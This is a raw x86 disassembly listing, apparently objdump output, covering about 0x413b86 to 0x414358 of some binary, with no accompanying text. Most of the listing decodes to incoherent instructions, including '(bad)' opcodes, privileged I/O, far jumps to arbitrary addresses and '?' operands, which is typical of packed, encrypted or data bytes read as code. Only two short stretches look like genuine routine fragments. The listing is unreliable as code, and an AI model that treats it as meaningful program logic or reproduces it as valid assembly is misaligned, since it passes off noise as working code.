  413b86:	and    BYTE PTR [eax],ah
  413b88:	adc    ebx,0x1f
  413b8b:	lods   al,BYTE PTR ds:[esi]
  413b8c:	cmp    al,0x50
  413b8e:	xlat   BYTE PTR ds:[ebx]
  413b8f:	or     BYTE PTR [eax-0x396baa95],ch
  413b95:	push   edi
  413b96:	jbe    0x413b1b
  413b98:	add    BYTE PTR [ebx+0x28682842],0x7f
  413b9f:	jns    0x413bef
  413ba1:	cmp    edi,DWORD PTR [ebx+0xb]
  413ba4:	xbegin 0xf9a96ba
  413baa:	mov    cl,0xae
  413bac:	xchg   edi,eax
  413bad:	add    ebx,DWORD PTR [eax]
  413baf:	xchg   ecx,eax
  413bb0:	loope  0x413b9f
  413bb2:	dec    eax
  413bb3:	jne    0x413c0a
  413bb5:	mov    esi,0x47f67b61
  413bba:	je     0x413b44
  413bbc:	aas    
  413bbd:	out    0x18,eax
  413bbf:	or     eax,0x5f537916
  413bc4:	dec    eax
  413bc5:	cmp    al,0x5c
  413bc7:	xchg   DWORD PTR [ebp+0xe9f359f],esp
  413bcd:	daa    
  413bce:	inc    ebx
  413bcf:	xchg   ebx,eax
  413bd0:	pusha  
  413bd1:	imul   ebp
  413bd3:	sub    BYTE PTR [ebx],bh
  413bd5:	mov    ecx,0x5a930fab
  413bda:	shl    ecx,0x1e
  413bdd:	xor    edx,edx
  413bdf:	or     eax,edx
  413be1:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  413be5:	mov    eax,DWORD PTR [ebp+0x14]
  413be8:	add    BYTE PTR [eax],cl
  413bea:	mov    eax,DWORD PTR [ebp-0x38]
  413bed:	mov    ecx,DWORD PTR [ebp-0x34]
  413bf0:	shrd   eax,ecx,0x2
  413bf4:	shr    ecx,0x2
  413bf7:	mov    ecx,DWORD PTR [ebp-0x38]
  413bfa:	mov    edx,DWORD PTR [ebp-0x34]
  413bfd:	xor    eax,edi
  413bff:	shl    ecx,0x1e
  413c02:	mov    ecx,DWORD PTR [ebp-0x38]
  413c05:	jmp    0x41418f
  413c0a:	sahf   
  413c0b:	(bad)  
  413c0c:	push   cs
  413c0d:	sub    esi,ebp
  413c0f:	sbb    BYTE PTR [eax],bl
  413c11:	inc    eax
  413c12:	adc    al,0xc8
  413c14:	sub    BYTE PTR [esi+0x68efc814],0xb
  413c1b:	repnz or al,0x16
  413c1e:	cmp    eax,0x3b161604
  413c23:	or     al,0xae
  413c25:	adc    al,0x5f
  413c27:	pop    esi
  413c28:	iret   
  413c29:	das    
  413c2a:	xchg   ecx,eax
  413c2b:	jno    0x413ca9
  413c2d:	pushf  
  413c2e:	xchg   esp,eax
  413c2f:	adc    al,0x60
  413c31:	cmp    BYTE PTR [edi+ebp*4+0x26e672fb],dh
  413c38:	ins    DWORD PTR es:[edi],dx
  413c39:	cs std 
  413c3b:	call   0x6813e48
  413c40:	stos   BYTE PTR es:[edi],al
  413c41:	bswap  edi
  413c43:	xor    eax,0x1dbb9f29
  413c48:	or     al,0x2e
  413c4a:	shl    ebp,cl
  413c4c:	cli    
  413c4d:	push   edx
  413c4e:	imul   ecx,DWORD PTR [ebp-0x52936845],0xdbb86f49
  413c58:	pop    es
  413c59:	sub    edi,ebx
  413c5b:	adc    BYTE PTR [ebp+0x46],dh
  413c5e:	test   eax,0x415552b9
  413c63:	push   es
  413c64:	lahf   
  413c65:	dec    eax
  413c66:	enter  0x482b,0x22
  413c6a:	popa   
  413c6b:	clc    
  413c6c:	nop
  413c6d:	(bad)  
  413c6e:	popa   
  413c6f:	mov    ah,0x66
  413c71:	in     eax,0x16
  413c73:	enter  0xa1f7,0x1b
  413c77:	ins    DWORD PTR es:[edi],dx
  413c78:	add    edi,eax
  413c7a:	pusha  
  413c7b:	(bad)  
  413c7c:	repnz dec esp
  413c7e:	mov    ecx,0x79d5bbd4
  413c83:	mov    ch,ah
  413c85:	mov    ebx,0x8165cdcd
  413c8a:	mov    eax,0xf0e5c1c3
  413c8f:	in     eax,dx
  413c90:	shl    eax,1
  413c92:	test   DWORD PTR [edi+0x6eb0a5b3],ebx
  413c98:	jge    0x413c95
  413c9a:	lahf   
  413c9b:	scas   al,BYTE PTR es:[edi]
  413c9c:	fsubr  st,st(4)
  413c9e:	push   ebp
  413c9f:	sub    DWORD PTR [eax+ebp*4],ebp
  413ca2:	ja     0x413d1a
  413ca4:	push   esp
  413ca5:	or     DWORD PTR [esi+0x8],esp
  413ca8:	or     BYTE PTR [edi],0xbd
  413cab:	mov    ch,0xc1
  413cad:	clc    
  413cae:	push   ebx
  413caf:	xor    BYTE PTR [edi-0x76],cl
  413cb2:	mov    ebx,0x5f5c19c8
  413cb7:	or     BYTE PTR [esi+0x7e1fc59e],al
  413cbd:	les    edi,FWORD PTR [eax-0x4b]
  413cc0:	out    0xe7,eax
  413cc2:	fwait
  413cc3:	cs clc 
  413cc5:	hlt    
  413cc6:	jmp    0x413d14
  413cc8:	and    DWORD PTR [edi-0x6c],edx
  413ccb:	add    dh,0x5
  413cce:	mov    DWORD PTR [esi],0xc398639a
  413cd4:	adc    BYTE PTR [edx-0x59bb0619],dh
  413cda:	call   0x525d168f
  413cdf:	or     al,0x6
  413ce1:	inc    edx
  413ce2:	xchg   edi,eax
  413ce3:	pop    edi
  413ce4:	xchg   esi,eax
  413ce5:	imul   ah
  413ce7:	add    bl,BYTE PTR gs:[edx-0x32c72f5a]
  413cee:	cmp    ebx,eax
  413cf0:	sti    
  413cf1:	hlt    
  413cf2:	jecxz  0x413cb7
  413cf4:	cdq    
  413cf5:	hlt    
  413cf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cf7:	iret   
  413cf8:	add    eax,0x1321224a
  413cfd:	push   ds
  413cfe:	scas   eax,DWORD PTR es:[edi]
  413cff:	push   0xa9a3a0b0
  413d04:	cs aas 
  413d06:	and    DWORD PTR [edi-0x3b],ebx
  413d09:	dec    esp
  413d0a:	and    DWORD PTR [eax],esi
  413d0c:	mov    DWORD PTR [eax-0x4c],0x31afb106
  413d13:	inc    esp
  413d14:	cld    
  413d15:	jnp    0x413d00
  413d17:	sbb    al,ah
  413d19:	xchg   ch,al
  413d1b:	mov    dl,0xea
  413d1d:	or     BYTE PTR [ebx+edi*2],al
  413d20:	cmp    ecx,DWORD PTR [eax+0x39b11ba7]
  413d26:	cmp    eax,0xdf89f6da
  413d2b:	outs   dx,BYTE PTR cs:[esi]
  413d2d:	cmp    esi,ebp
  413d2f:	adc    al,BYTE PTR [edi+0x241086e2]
  413d35:	outs   dx,DWORD PTR ds:[esi]
  413d36:	xor    edi,DWORD PTR [ecx]
  413d38:	retf   0x2a60
  413d3b:	pop    ebp
  413d3c:	(bad)  
  413d3d:	sbb    al,0x36
  413d3f:	adc    eax,0x8271e07e
  413d44:	sbb    DWORD PTR [ecx+0x5f401527],esp
  413d4a:	jl     0x413d1e
  413d4c:	int3   
  413d4d:	xchg   ah,bh
  413d4f:	push   0x5b
  413d51:	mov    al,bh
  413d53:	popf   
  413d54:	(bad)  
  413d55:	cmp    DWORD PTR [ecx],ebp
  413d57:	cld    
  413d58:	xchg   BYTE PTR [edi-0x53ff327f],ch
  413d5e:	test   BYTE PTR [edx-0xe5b0c73],cl
  413d64:	jge    0x413d10
  413d66:	imul   edi,DWORD PTR [edx+0x250b15c7],0xffffffe3
  413d6d:	stos   DWORD PTR es:[edi],eax
  413d6e:	je     0x413ddf
  413d70:	or     esi,ebp
  413d72:	mov    bl,0x84
  413d74:	xlat   BYTE PTR ds:[ebx]
  413d75:	addr16 leave 
  413d77:	inc    esi
  413d78:	xchg   ebp,eax
  413d79:	mov    ds:0x71583924,eax
  413d7e:	int    0xe0
  413d80:	int    0x73
  413d82:	sbb    BYTE PTR [esi+eax*2],al
  413d85:	xor    eax,0x83418aaf
  413d8a:	add    al,0x8c
  413d8c:	mov    cl,0x5a
  413d8e:	mov    eax,0x31097067
  413d93:	lahf   
  413d94:	fmul   QWORD PTR [edi]
  413d96:	push   esi
  413d97:	or     edi,DWORD PTR [eax-0x8]
  413d9a:	inc    edi
  413d9b:	sub    eax,0xc8c909e
  413da0:	stos   BYTE PTR es:[edi],al
  413da1:	(bad)  [esi]
  413da3:	push   edi
  413da4:	ror    ah,cl
  413da6:	and    edx,0x79
  413da9:	push   ebp
  413daa:	inc    ebp
  413dab:	dec    ecx
  413dac:	icebp  
  413dad:	test   eax,0xc1908cfd
  413db2:	rol    DWORD PTR [eax+0x4f557ac9],1
  413db8:	bound  ebx,QWORD PTR [ebx]
  413dba:	in     al,dx
  413dbb:	sub    DWORD PTR [eax],esp
  413dbd:	ins    BYTE PTR es:[edi],dx
  413dbe:	scas   eax,DWORD PTR es:[edi]
  413dbf:	sub    al,0xfc
  413dc1:	daa    
  413dc2:	sbb    al,0x49
  413dc4:	loop   0x413de1
  413dc6:	cmp    esi,DWORD PTR [edx]
  413dc8:	stos   DWORD PTR es:[edi],eax
  413dc9:	int    0x3d
  413dcb:	xchg   BYTE PTR [ebx+0x4fd9f7d],al
  413dd1:	sahf   
  413dd2:	ins    BYTE PTR es:[edi],dx
  413dd3:	mov    dl,BYTE PTR [ebx+0x2f0d5f85]
  413dd9:	mov    ch,0x56
  413ddb:	and    eax,ecx
  413ddd:	div    ecx
  413ddf:	sub    eax,0x77cdaaf9
  413de4:	cwde   
  413de5:	(bad)  [edi+ebp*1-0x685382ec]
  413dec:	fstp   TBYTE PTR [ebx]
  413dee:	push   ds
  413def:	add    BYTE PTR [edi],bl
  413df1:	pop    ds
  413df2:	pop    ebx
  413df3:	or     ch,BYTE PTR [esi-0x6e3f6e4f]
  413df9:	pop    esp
  413dfa:	ret    
  413dfb:	dec    edx
  413dfc:	mov    edi,0x8e7d3fd9
  413e01:	mov    ebx,DWORD PTR [edx+0x2c]
  413e04:	fcmovnbe st,st(7)
  413e06:	std    
  413e07:	push   esp
  413e08:	pop    ds
  413e09:	dec    edi
  413e0a:	or     DWORD PTR [edx-0x7a62cee0],0x4bb7d3b7
  413e14:	inc    eax
  413e15:	hlt    
  413e16:	mov    edi,0xa1887a9b
  413e1b:	sub    edx,DWORD PTR [ecx-0x1e]
  413e1e:	sub    DWORD PTR [ecx+0xae5c3db],ebx
  413e24:	push   ecx
  413e25:	pop    ss
  413e26:	dec    ebx
  413e27:	(bad)  
  413e29:	push   eax
  413e2a:	out    0x2d,eax
  413e2c:	jle    0x413e04
  413e2e:	gs add ah,0xe8
  413e32:	(bad)  
  413e33:	stc    
  413e34:	push   eax
  413e35:	dec    BYTE PTR [ebp-0x4b12fb31]
  413e3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e3c:	clc    
  413e3d:	test   eax,0x57c9687f
  413e42:	jp     0x413e9f
  413e44:	jge    0x413dd9
  413e46:	jb     0x413df3
  413e48:	stc    
  413e49:	int3   
  413e4a:	mov    ?,WORD PTR [edi+0x160dfed2]
  413e50:	clc    
  413e51:	inc    eax
  413e52:	lods   al,BYTE PTR ds:[esi]
  413e53:	pop    eax
  413e54:	cmp    BYTE PTR [eax+0x0],0xb2
  413e58:	pushf  
  413e59:	mov    cl,0xe3
  413e5b:	dec    eax
  413e5c:	mov    ch,0x85
  413e5e:	jmp    0x86ca:0xc58a1aab
  413e65:	fcomip st,st(0)
  413e67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e68:	cmp    eax,0x5b48c427
  413e6d:	sub    esp,ebx
  413e6f:	xchg   edi,eax
  413e70:	fimul  WORD PTR [edi]
  413e72:	(bad)  
  413e73:	imul   DWORD PTR [esi-0x73]
  413e76:	(bad)  
  413e77:	jnp    0x413e4a
  413e79:	push   ebp
  413e7a:	add    BYTE PTR [edi+ebx*1-0x59],cl
  413e7e:	cmp    al,0xf3
  413e80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e81:	in     al,dx
  413e82:	aas    
  413e83:	inc    ebx
  413e84:	inc    esi
  413e85:	push   0x15
  413e87:	sbb    DWORD PTR [eax],esi
  413e89:	xchg   edx,eax
  413e8a:	pop    ss
  413e8b:	sub    al,0xfb
  413e8d:	add    al,0xee
  413e8f:	adc    eax,0x13304f5c
  413e94:	inc    ebx
  413e95:	ret    0x8ca7
  413e98:	mov    cl,0x37
  413e9a:	rcl    ah,cl
  413e9c:	dec    esi
  413e9d:	fadd   QWORD PTR [edx+0x442c2cb1]
  413ea3:	mov    ah,0x4f
  413ea5:	in     eax,dx
  413ea6:	adc    DWORD PTR [ebx],0x6006b6a6
  413eac:	dec    ecx
  413ead:	jg     0x413ec4
  413eaf:	repnz lea esi,[edi]
  413eb2:	int3   
  413eb3:	xor    al,0xd
  413eb5:	or     edx,DWORD PTR [edi-0x108a6fa8]
  413ebb:	mov    edx,edx
  413ebd:	mov    fs,WORD PTR [ebx+0x577f62b5]
  413ec3:	sub    bl,BYTE PTR ds:0x8d91edfa
  413ec9:	fcom   DWORD PTR [esi-0x1e]
  413ecc:	jecxz  0x413e7a
  413ece:	sbb    DWORD PTR [edi],ecx
  413ed0:	jns    0x413e7f
  413ed2:	sbb    al,0x5c
  413ed4:	xchg   esp,eax
  413ed5:	ret    0xdba
  413ed8:	pop    ds
  413ed9:	add    ah,al
  413edb:	sbb    dh,BYTE PTR [ebx]
  413edd:	retf   
  413ede:	mov    eax,0xa5d25c00
  413ee3:	pmullw mm0,QWORD PTR [edi]
  413ee6:	jnp    0x413e85
  413ee8:	sub    esi,DWORD PTR [ecx-0x75]
  413eeb:	push   esi
  413eec:	call   0xbc09:0xfb947941
  413ef3:	add    eax,DWORD PTR [ecx]
  413ef5:	ror    BYTE PTR [edi+0x3528593],cl
  413efb:	shl    BYTE PTR [eax+0x29a858df],cl
  413f01:	aad    0xf3
  413f03:	xor    al,0xa
  413f05:	or     dh,0x9f
  413f08:	push   es
  413f09:	sbb    ch,BYTE PTR [esi]
  413f0b:	out    dx,al
  413f0c:	jne    0x413f52
  413f0e:	cs sti 
  413f10:	inc    ebp
  413f11:	loop   0x413edb
  413f13:	sbb    al,0x3c
  413f15:	jo     0x413ef4
  413f17:	push   es
  413f18:	and    DWORD PTR [ecx-0x1a],edi
  413f1b:	jno    0x413f16
  413f1d:	mov    eax,esi
  413f1f:	ficom  WORD PTR [ebx+0x6e17ac1c]
  413f25:	es mov bl,al
  413f28:	sub    al,0x39
  413f2a:	lahf   
  413f2b:	ss es adc ebx,ecx
  413f2f:	cmp    dh,BYTE PTR [ecx]
  413f31:	pop    ebx
  413f32:	push   ds
  413f33:	adc    BYTE PTR ds:0xfe6cc75b,al
  413f39:	xchg   ecx,eax
  413f3a:	jne    0x413f97
  413f3c:	cs js  0x413fa2
  413f3f:	cmp    edx,0xffffffec
  413f42:	mov    al,ds:0xc4c21860
  413f47:	sbb    DWORD PTR [edi+0x49d35967],esp
  413f4d:	jno    0x413f5e
  413f4f:	sbb    esi,0xefd1914f
  413f55:	cmp    eax,0xffad039d
  413f5a:	mov    eax,0xff7f40aa
  413f5f:	inc    esp
  413f60:	or     esi,esp
  413f62:	in     al,0x27
  413f64:	enter  0xebb9,0x50
  413f68:	sub    edi,DWORD PTR [esi-0x55]
  413f6b:	inc    ecx
  413f6c:	and    DWORD PTR [edi],esi
  413f6e:	jae    0x413f07
  413f70:	in     eax,dx
  413f71:	sub    eax,0x3e7a5a40
  413f76:	sub    eax,0x1bb74887
  413f7b:	nop
  413f7c:	imul   eax,DWORD PTR [esi+0x7824b56c],0xfffffff5
  413f83:	fstp   QWORD PTR [edx+edx*4+0x7]
  413f87:	clc    
  413f88:	das    
  413f89:	aaa    
  413f8a:	rcl    DWORD PTR [edi],1
  413f8c:	sbb    al,0x83
  413f8e:	jbe    0x413fe6
  413f90:	daa    
  413f91:	ds popf 
  413f93:	(bad)
  413f97:	test   DWORD PTR [ecx-0x52],ecx
  413f9a:	rcl    BYTE PTR [ebx],cl
  413f9c:	sbb    eax,0x43d5396d
  413fa1:	js     0x413f8d
  413fa3:	int    0xc
  413fa5:	mul    BYTE PTR [edx-0x383a49fd]
  413fab:	ja     0x413ff6
  413fad:	lea    edx,[ebp+ebp*8+0x2d]
  413fb1:	sub    eax,0x4da6fdb6
  413fb6:	xchg   esi,eax
  413fb7:	and    DWORD PTR [edx-0x14],eax
  413fba:	repnz repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fbd:	dec    edi
  413fbe:	sbb    ebp,DWORD PTR ds:[edi+0x45]
  413fc2:	je     0x414000
  413fc4:	jns    0x413ff9
  413fc6:	sub    ah,BYTE PTR [esi+0x4a]
  413fc9:	into   
  413fca:	and    DWORD PTR [eax+0x16b70879],ecx
  413fd0:	dec    eax
  413fd1:	fiadd  WORD PTR [esi+edi*4]
  413fd4:	jbe    0x413fd3
  413fd6:	sar    dh,0x8c
  413fd9:	dec    esp
  413fda:	mov    dl,0xdc
  413fdc:	mov    BYTE PTR [ebx],cl
  413fde:	xchg   BYTE PTR [edx],bh
  413fe0:	cli    
  413fe1:	push   0x71fc33cb
  413fe6:	mov    eax,0xe8320531
  413feb:	push   0x6
  413fed:	(bad)  
  413fee:	fisubr WORD PTR [ebp+0x4b]
  413ff1:	fsub   QWORD PTR [eax-0x2a]
  413ff4:	stos   DWORD PTR es:[edi],eax
  413ff5:	mov    bh,0x5
  413ff7:	test   DWORD PTR [ebp-0x9],0x432838d4
  413ffe:	enter  0x466b,0x99
  414002:	call   0x3f43:0xa3b1c077
  414009:	shr    DWORD PTR [edx-0x7143c4e9],0x43
  414010:	stos   DWORD PTR es:[edi],eax
  414011:	daa    
  414012:	sub    ebx,DWORD PTR [eax+0x76]
  414015:	daa    
  414016:	dec    ebx
  414017:	in     al,0xa9
  414019:	add    BYTE PTR [eax+0x4b780405],ah
  41401f:	inc    esp
  414020:	push   ecx
  414021:	xchg   edx,eax
  414022:	or     eax,0x682ede8d
  414027:	jbe    0x414001
  414029:	push   edi
  41402a:	and    al,0xbc
  41402c:	adc    eax,0x9ec2aba8
  414031:	inc    ecx
  414032:	mov    edi,0xd6857274
  414037:	inc    edi
  414038:	or     BYTE PTR [ebp+0x677f76be],0x84
  41403f:	in     al,0x4d
  414041:	loope  0x413fd3
  414043:	into   
  414044:	mov    edi,edx
  414046:	adc    bh,ah
  414048:	mov    edi,0x629b7d50
  41404d:	add    BYTE PTR [ecx],dl
  41404f:	push   0x9bde40f3
  414054:	iret   
  414055:	std    
  414056:	cwde   
  414057:	int    0xb0
  414059:	outs   dx,DWORD PTR ds:[esi]
  41405a:	or     eax,0x8eb52686
  41405f:	call   0x1220:0xfef4b9ca
  414066:	and    ebp,edx
  414068:	mov    edx,0xf5c79a6b
  41406d:	mov    eax,ds:0xd39cd2f6
  414072:	and    eax,0xe7c73c1a
  414077:	push   ebp
  414078:	mov    eax,ds:0xab876368
  41407d:	sub    al,dl
  41407f:	adc    al,0x42
  414081:	sahf   
  414082:	test   DWORD PTR [esi+0x50],ebp
  414085:	mov    fs,WORD PTR [eax+eax*1-0x11932f04]
  41408c:	fwait
  41408d:	scas   al,BYTE PTR es:[edi]
  41408e:	push   DWORD PTR [esi-0x6aa1bdf9]
  414094:	mov    WORD PTR [ebx],gs
  414096:	mov    cl,0x64
  414098:	pop    ebx
  414099:	into   
  41409a:	lods   eax,DWORD PTR ds:[esi]
  41409b:	add    ebx,DWORD PTR [edx+0x1a3e5dbf]
  4140a1:	(bad)  
  4140a2:	addr16 popa 
  4140a4:	in     al,0xa9
  4140a6:	jg     0x414100
  4140a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140a9:	jecxz  0x414103
  4140ab:	sub    al,0x42
  4140ad:	cwde   
  4140ae:	jb     0x414093
  4140b0:	mov    ah,bh
  4140b2:	out    0x27,al
  4140b4:	in     al,dx
  4140b5:	and    al,0x6
  4140b7:	fld    QWORD PTR [eax-0x7c]
  4140ba:	jmp    0x330cadfa
  4140bf:	sbb    al,0x8e
  4140c1:	sbb    dl,0x5
  4140c4:	cmp    bh,BYTE PTR [eax-0x2329735]
  4140ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140cb:	out    dx,al
  4140cc:	mov    WORD PTR [edi+edi*8],ss
  4140cf:	push   ds
  4140d0:	ds test ah,cl
  4140d3:	not    DWORD PTR [eax-0x1b271f01]
  4140d9:	sbb    eax,0x81fb9578
  4140de:	in     eax,0xa0
  4140e0:	mov    ebx,0x2d9daa2d
  4140e5:	pushf  
  4140e6:	inc    ebx
  4140e7:	pop    esi
  4140e8:	jo     0x414167
  4140ea:	daa    
  4140eb:	retf   
  4140ec:	and    al,0xa0
  4140ee:	(bad)  
  4140ef:	in     eax,0xdc
  4140f1:	adc    eax,0x6408f0c5
  4140f6:	jle    0x41411e
  4140f8:	popf   
  4140f9:	or     al,BYTE PTR [eax+0x13]
  4140fc:	xlat   BYTE PTR ds:[ebx]
  4140fd:	jno    0x414171
  4140ff:	clc    
  414100:	jg     0x414112
  414102:	jp     0x4140a4
  414104:	sbb    ebx,DWORD PTR [ebx+ecx*1]
  414107:	stc    
  414108:	lock mov ch,BYTE PTR [edx+0x71]
  41410c:	add    BYTE PTR [esi+0x1ed5ffb7],al
  414112:	addr16 pop eax
  414114:	xor    cl,cl
  414116:	popf   
  414117:	(bad)  
  414118:	jmp    0x6e379d1b
  41411d:	xchg   ebx,eax
  41411e:	cmp    esp,DWORD PTR [eax]
  414120:	sbb    esi,DWORD PTR [eax-0x498cf6a3]
  414126:	mov    bl,0xfb
  414128:	int3   
  414129:	outs   dx,DWORD PTR ds:[esi]
  41412a:	addr16 xor eax,0x14bda91d
  414130:	cmp    DWORD PTR [ebx-0x4c],edi
  414133:	jnp    0x414180
  414135:	test   BYTE PTR [esi+0x3f53aea],0x9c
  41413c:	mov    al,0x21
  41413e:	inc    ebp
  41413f:	shr    BYTE PTR [ecx],0x6f
  414142:	lea    edx,[ebx]
  414144:	leave  
  414145:	xchg   edi,eax
  414146:	ret    0xd214
  414149:	paddd  mm5,QWORD PTR [edx+0x7c]
  41414d:	dec    ebp
  41414e:	mov    DWORD PTR [esp+edi*4+0x41fa5aa7],ebp
  414155:	inc    ebp
  414156:	cmp    ah,dl
  414158:	out    dx,al
  414159:	es test edi,esp
  41415c:	xor    DWORD PTR [edi],0xffffffb9
  41415f:	jg     0x414100
  414161:	xchg   edi,eax
  414162:	mov    ebp,0xfad8cc96
  414167:	lock popf 
  414169:	mov    ebp,0x7156099a
  41416e:	mov    esp,0x68aa2d5
  414173:	jp     0x414165
  414175:	push   ebx
  414176:	ja     0x41417f
  414178:	xor    esi,edi
  41417a:	pop    esp
  41417b:	lea    ecx,[edi+ecx*4+0x3a8cd399]
  414182:	adc    cl,BYTE PTR [edx+0x6d]
  414185:	ins    DWORD PTR es:[edi],dx
  414186:	cmp    BYTE PTR [edx-0x50c3380e],ah
  41418c:	cdq    
  41418d:	ins    BYTE PTR es:[edi],dx
  41418e:	mov    edi,0xc20bd233
  414193:	mov    edx,DWORD PTR [ebp-0x34]
  414196:	add    eax,DWORD PTR ds:0x422298
  41419c:	shrd   ecx,edx,0x2
  4141a0:	xor    ecx,edi
  4141a2:	shr    edx,0x2
  4141a5:	mov    edx,DWORD PTR [ebp-0x38]
  4141a8:	mov    edi,DWORD PTR [ebp-0x34]
  4141ab:	xor    edi,edi
  4141ad:	jmp    0x414737
  4141b2:	jb     0x414219
  4141b4:	(bad)  
  4141b5:	jecxz  0x414157
  4141b7:	sub    BYTE PTR [edx],dl
  4141b9:	push   esp
  4141ba:	xchg   edx,eax
  4141bb:	das    
  4141bc:	mov    esp,0x423e8bae
  4141c1:	test   al,0x40
  4141c3:	lock or al,0x16
  4141c6:	cmp    eax,0xe8161604
  4141cb:	mov    ecx,0xc6a81f15
  4141d0:	clc    
  4141d1:	dec    eax
  4141d2:	nop
  4141d3:	aam    0x5b
  4141d5:	mov    dl,0xdc
  4141d7:	test   BYTE PTR [ebp-0x2751728b],0xbc
  4141de:	gs cld 
  4141e0:	xor    BYTE PTR [ebx+0x62],bh
  4141e3:	cdq    
  4141e4:	imul   ecx,DWORD PTR [edx+0x762e9f12],0xe
  4141eb:	jg     0x4141b3
  4141ed:	iret   
  4141ee:	dec    ecx
  4141ef:	or     ecx,DWORD PTR [ecx+edi*2+0x59fbc4a7]
  4141f6:	repz retf 
  4141f8:	test   eax,0x811fdd8d
  4141fd:	sub    BYTE PTR [edx],bh
  4141ff:	mov    WORD PTR [edi+0x3aaa4306],?
  414205:	sbb    BYTE PTR ds:0x64a31396,ah
  41420b:	jge    0x4141fd
  41420d:	pop    edx
  41420e:	push   ss
  41420f:	push   ebp
  414210:	mov    edi,0xd803f768
  414215:	lds    ebp,FWORD PTR [ecx-0x9]
  414218:	scas   al,BYTE PTR es:[edi]
  414219:	adc    BYTE PTR [esp+ecx*2-0x66],dl
  41421d:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41421f:	sub    DWORD PTR [esi+0x2daea7bb],ecx
  414225:	int3   
  414226:	bound  esi,QWORD PTR [ebp+0x41664ad3]
  41422c:	mov    ecx,0x1663fe66
  414231:	sbb    al,bh
  414233:	add    DWORD PTR cs:[ebp-0x3f],0xffffffc7
  414238:	stos   DWORD PTR es:[edi],eax
  414239:	cmp    al,BYTE PTR ds:0xff9c3220
  41423f:	push   esp
  414240:	mov    ebx,0xe1d5123a
  414245:	add    ecx,eax
  414247:	xlat   BYTE PTR ds:[ebx]
  414248:	hlt    
  414249:	iret   
  41424a:	stc    
  41424b:	loope  0x4142bb
  41424d:	xchg   edi,eax
  41424e:	bnd jp 0x41424f
  414251:	loop   0x4142b4
  414253:	(bad)  
  414254:	fwait
  414255:	xor    al,0xc7
  414257:	xor    bh,dl
  414259:	cmp    eax,0xcfb4b28b
  41425e:	in     eax,dx
  41425f:	stc    
  414260:	les    ecx,FWORD PTR [ecx]
  414262:	cmp    al,0x5
  414264:	mov    al,0xbf
  414266:	mov    esi,edi
  414268:	adc    eax,0x7b02c758
  41426d:	lahf   
  41426e:	mov    esp,0x7c860eeb
  414273:	jg     0x4142e4
  414275:	mov    es,ebx
  414277:	pop    edi
  414278:	pop    esi
  414279:	dec    esi
  41427a:	adc    eax,0xd677b4d4
  41427f:	sub    eax,0xf3a261f0
  414284:	jle    0x414270
  414286:	add    dl,BYTE PTR [esi+0x49]
  414289:	in     al,dx
  41428a:	es push edx
  41428c:	and    ecx,DWORD PTR [edx+0x39]
  41428f:	mov    ah,0xf4
  414291:	add    dl,BYTE PTR [ecx-0x1be2da3c]
  414297:	xor    al,0x80
  414299:	popf   
  41429a:	cwde   
  41429b:	mov    bl,0xb6
  41429d:	push   ds
  41429e:	jecxz  0x4142e7
  4142a0:	test   DWORD PTR gs:[edx],esi
  4142a3:	dec    edi
  4142a4:	dec    eax
  4142a5:	popa   
  4142a6:	ror    BYTE PTR [edx+ecx*2+0x36adde9a],cl
  4142ad:	rcr    BYTE PTR [esi],cl
  4142af:	fidiv  DWORD PTR [edi+0x6eaab1b5]
  4142b5:	das    
  4142b6:	mov    eax,0x924c8f3d
  4142bb:	int    0x9c
  4142bd:	jae    0x4142f4
  4142bf:	adc    ebp,DWORD PTR [eax+0x71]
  4142c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142c3:	and    ebx,edi
  4142c5:	or     edx,esi
  4142c7:	mov    eax,ds:0xc048e146
  4142cc:	fs or  bl,dl
  4142cf:	jle    0x414272
  4142d1:	push   ebx
  4142d2:	mov    al,0x13
  4142d4:	xchg   ebp,eax
  4142d5:	fsub   st,st(7)
  4142d7:	shl    BYTE PTR [edx],0x43
  4142da:	push   eax
  4142db:	and    ebp,DWORD PTR [edx+0x4494a97e]
  4142e1:	mov    esi,0xf08ef33e
  4142e6:	adc    ch,al
  4142e8:	jae    0x4142fa
  4142ea:	mov    edi,esp
  4142ec:	jmp    0xab60be09
  4142f1:	out    0x3c,eax
  4142f3:	push   edx
  4142f4:	sub    bh,ch
  4142f6:	mov    ds,WORD PTR [edx]
  4142f8:	jp     0x4142dc
  4142fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142fb:	test   ecx,edi
  4142fd:	enter  0x3b0b,0x7c
  414301:	push   cs
  414302:	mov    es,WORD PTR [eax]
  414304:	fs fwait
  414306:	inc    esp
  414307:	(bad)  
  414308:	jo     0x41431f
  41430a:	ins    BYTE PTR es:[edi],dx
  41430b:	out    dx,al
  41430c:	xchg   ecx,eax
  41430d:	loop   0x4142e4
  41430f:	push   eax
  414310:	retf   0x3b92
  414313:	xor    BYTE PTR [edi+edx*1],bh
  414316:	xor    al,ah
  414318:	fldcw  WORD PTR [edx]
  41431a:	mov    bl,0x8e
  41431c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41431d:	shl    BYTE PTR [ecx+0x25],cl
  414320:	pop    edi
  414321:	(bad)  
  414322:	add    DWORD PTR [eax+0x37],edi
  414325:	push   ss
  414326:	sub    ecx,eax
  414328:	jno    0x414355
  41432a:	bound  ebx,QWORD PTR [edx-0x5d68e806]
  414330:	dec    ecx
  414331:	push   edx
  414332:	push   ds
  414333:	(bad)  
  414334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414335:	mov    edx,0xacaa7ef8
  41433a:	and    BYTE PTR [ecx+0x33a92603],cl
  414340:	scas   al,BYTE PTR es:[edi]
  414341:	pop    eax
  414342:	js     0x41437c
  414344:	int3   
  414345:	push   esp
  414346:	in     al,dx
  414347:	pop    esi
  414348:	imul   ebp,ecx,0x5e
  41434b:	data16 lahf 
  41434d:	in     eax,dx
  41434e:	not    cl
  414350:	push   ss
  414351:	aam    0xaa
  414353:	pop    edx
  414354:	jo     0x414373
  414356:	or     al,0xcb
  414358:	mov    al,ds:0x61b4cba0
